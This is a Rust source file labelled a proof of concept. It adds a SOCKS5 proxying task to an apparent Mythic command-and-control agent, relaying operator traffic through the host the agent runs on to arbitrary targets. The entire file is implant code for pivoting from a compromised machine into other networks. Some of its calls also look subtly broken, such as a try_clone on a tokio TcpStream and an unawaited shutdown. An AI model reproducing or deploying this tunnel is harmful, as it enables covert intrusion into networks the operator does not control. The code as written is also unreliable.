// POC by Gerar
use crate::agent::AgentTask;
use crate::mythic_continued;
use base64::{decode, encode};
use serde::{Deserialize, Serialize};
use serde_json::json;
use std::collections::HashMap;
use std::error::Error;
use std::net::{Ipv4Addr, Ipv6Addr, SocketAddr};
use std::sync::mpsc as std_mpsc;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio::sync::mpsc as tokio_mpsc;
use tokio::time::{timeout, Duration};

#[derive(Debug, Deserialize)]
struct SocksTask {
    port: u16,
}

// Optional: make your channel payload typed instead of raw Value.
#[derive(Debug, Clone, Serialize, Deserialize)]
struct WireMsg {
    server_id: String,
    data: String, // base64
    #[serde(default)]
    exit: bool,
}

/// Build a SOCKS5 response using the bound address.
/// REP = status (0x00 success, 0x01 general failure, 0x07 cmd not supported, etc.)
fn build_reply(rep: u8, bound: Option<SocketAddr>) -> Vec<u8> {
    let mut out = vec![0x05, rep, 0x00]; // VER, REP, RSV
    match bound {
        Some(SocketAddr::V4(v4)) => {
            out.push(0x01); // ATYP IPv4
            out.extend_from_slice(&v4.ip().octets());
            out.extend_from_slice(&v4.port().to_be_bytes());
        }
        Some(SocketAddr::V6(v6)) => {
            out.push(0x04); // ATYP IPv6
            out.extend_from_slice(&v6.ip().octets());
            out.extend_from_slice(&v6.port().to_be_bytes());
        }
        None => {
            // Fallback to 0.0.0.0:0 if we don't have a socket
            out.push(0x01);
            out.extend_from_slice(&Ipv4Addr::UNSPECIFIED.octets());
            out.extend_from_slice(&0u16.to_be_bytes());
        }
    }
    out
}

/// Send a data packet to Mythic via socks_out channel.
fn send_data(
    tx: &std_mpsc::Sender<serde_json::Value>,
    server_id: &str,
    data: &[u8],
    exit: bool,
) -> Result<(), Box<dyn Error>> {
    let packet = json!({
        "server_id": server_id,
        "data": encode(data),
        "exit": exit,
    });
    tx.send(packet)?;
    Ok(())
}

/// Parse the initial SOCKS5 CONNECT request from Mythic payload.
/// Returns (addr, port). Validates CMD + lengths.
fn parse_connect(decoded: &[u8]) -> Result<(String, u16), Box<dyn Error>> {
    // Minimal: VER, CMD, RSV, ATYP, ... DST.PORT(2)
    if decoded.len() < 10 {
        return Err("SOCKS5 request too short".into());
    }
    if decoded[0] != 0x05 {
        return Err("Unsupported SOCKS version".into());
    }
    if decoded[1] != 0x01 {
        return Err("SOCKS5 command not supported (only CONNECT)".into());
    }
    let atyp = decoded[3];
    match atyp {
        0x01 => {
            // IPv4: 4 bytes + 2 port
            if decoded.len() < 10 {
                return Err("Malformed IPv4 CONNECT frame".into());
            }
            let ip = Ipv4Addr::new(decoded[4], decoded[5], decoded[6], decoded[7]);
            let port = u16::from_be_bytes([decoded[8], decoded[9]]);
            Ok((ip.to_string(), port))
        }
        0x03 => {
            // DOMAIN: 1 len + domain + 2 port
            let len = decoded[4] as usize;
            let need = 5 + len + 2;
            if decoded.len() < need {
                return Err("Malformed domain CONNECT frame".into());
            }
            let domain = std::str::from_utf8(&decoded[5..5 + len])?.to_string();
            let port = u16::from_be_bytes([decoded[5 + len], decoded[6 + len]]);
            Ok((domain, port))
        }
        0x04 => {
            // IPv6: 16 bytes + 2 port
            let need = 4 + 16 + 2;
            if decoded.len() < need {
                return Err("Malformed IPv6 CONNECT frame".into());
            }
            let mut octets = [0u8; 16];
            octets.copy_from_slice(&decoded[4..20]);
            let ip = Ipv6Addr::from(octets);
            let port = u16::from_be_bytes([decoded[20], decoded[21]]);
            Ok((ip.to_string(), port))
        }
        _ => Err("Unsupported ATYP in SOCKS5 request".into()),
    }
}

/// A single SOCKS session: consumes per-session messages and forwards bytes.
async fn handle_connection(
    server_id: String,
    mut sess_rx: tokio_mpsc::UnboundedReceiver<serde_json::Value>,
    tx_out: std_mpsc::Sender<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // 1) Expect the initial CONNECT frame from Mythic
    let first = match sess_rx.recv().await {
        Some(v) => v,
        None => return Ok(()), // channel closed
    };
    let decoded = decode(first["data"].as_str().unwrap_or(""))?;
    let (addr, port) = match parse_connect(&decoded) {
        Ok(v) => v,
        Err(_) => {
            let reply = build_reply(0x07, None); // Command not supported / malformed
            let _ = send_data(&tx_out, &server_id, &reply, true);
            return Ok(());
        }
    };

    // 2) Connect to the remote target (with a timeout)
    let mut remote = match timeout(Duration::from_secs(15), TcpStream::connect((addr.as_str(), port))).await {
        Ok(Ok(s)) => s,
        _ => {
            let fail = build_reply(0x01, None);
            let _ = send_data(&tx_out, &server_id, &fail, true);
            return Ok(());
        }
    };

    // 3) Send success reply with the bound address/port
    let bound = remote.local_addr().ok();
    let ok = build_reply(0x00, bound);
    send_data(&tx_out, &server_id, &ok, false)?;

    // 4) Pipe: remote -> Mythic
    let tx_clone = tx_out.clone();
    let sid_clone = server_id.clone();
    let mut remote_r = remote.try_clone()?;
    let a2m = tokio::spawn(async move {
        let mut buf = vec![0u8; 16 * 1024];
        loop {
            match timeout(Duration::from_secs(300), remote_r.read(&mut buf)).await {
                Ok(Ok(0)) => {
                    let _ = send_data(&tx_clone, &sid_clone, b"", true);
                    break;
                }
                Ok(Ok(n)) => {
                    if n > 0 {
                        let _ = send_data(&tx_clone, &sid_clone, &buf[..n], false);
                    }
                }
                Ok(Err(_e)) | Err(_) => {
                    let _ = send_data(&tx_clone, &sid_clone, b"", true);
                    break;
                }
            }
        }
    });

    // 5) Pipe: Mythic -> remote
    let mut remote_w = remote;
    let m2a = tokio::spawn(async move {
        while let Some(msg) = sess_rx.recv().await {
            let m_sid = msg["server_id"].as_str().unwrap_or("");
            if m_sid != server_id {
                // Shouldn't happen: messages are per-session; skip just in case.
                continue;
            }
            if msg["exit"].as_bool().unwrap_or(false) {
                let _ = remote_w.shutdown().await;
                break;
            }
            if let Ok(data) = decode(msg["data"].as_str().unwrap_or("")) {
                if data.is_empty() {
                    continue;
                }
                // Optional: add a write timeout
                let _ = timeout(Duration::from_secs(60), remote_w.write_all(&data)).await;
            }
        }
        let _ = remote_w.shutdown();
    });

    let _ = a2m.await;
    let _ = m2a.await;
    Ok(())
}

/// Main entry point: bridges std mpsc -> Tokio, dispatches by server_id and spawns sessions.
pub fn handle_socks(
    tx: &std_mpsc::Sender<serde_json::Value>,
    rx: std_mpsc::Receiver<serde_json::Value>,
) -> Result<(), Box<dyn Error>> {
    // Receive initial task (unchanged)
    let task_val = rx.recv()?;
    let _task: AgentTask = serde_json::from_value(task_val)?;

    // Tell Mythic we're alive
    tx.send(mythic_continued!(
        _task.id,
        "SOCKS handler active",
        "Awaiting SOCKS proxy data from Mythic"
    ))?;

    // Bridge std mpsc -> tokio mpsc so we don't block the runtime
    let (bridge_tx, mut bridge_rx) = tokio_mpsc::unbounded_channel::<serde_json::Value>();
    std::thread::spawn(move || {
        while let Ok(v) = rx.recv() {
            let _ = bridge_tx.send(v);
        }
    });

    // Start the runtime and run the dispatcher
    let rt = tokio::runtime::Runtime::new()?;
    rt.block_on(async {
        // server_id -> session sender
        let mut sessions: HashMap<String, tokio_mpsc::UnboundedSender<serde_json::Value>> =
            HashMap::new();

        while let Some(msg) = bridge_rx.recv().await {
            let Some(server_id) = msg.get("server_id").and_then(|v| v.as_str()) else { continue };
            let exit = msg.get("exit").and_then(|v| v.as_bool()).unwrap_or(false);

            // Create session lazily on the first message we see for this server_id
            let entry = sessions.entry(server_id.to_string()).or_insert_with(|| {
                let (sess_tx, sess_rx) = tokio_mpsc::unbounded_channel();
                // Each session handles its own stream
                let sid = server_id.to_string();
                let tx_out = tx.clone();
                tokio::spawn(handle_connection(sid, sess_rx, tx_out));
                sess_tx
            });

            // Forward the message to the correct session
            let _ = entry.send(msg);

            // If this message says to exit, drop the route (session will end itself)
            if exit {
                sessions.remove(server_id);
            }
        }
        // Dispatcher channel closed, drop all sessions
        sessions.clear();
    });

    Ok(())
}

 
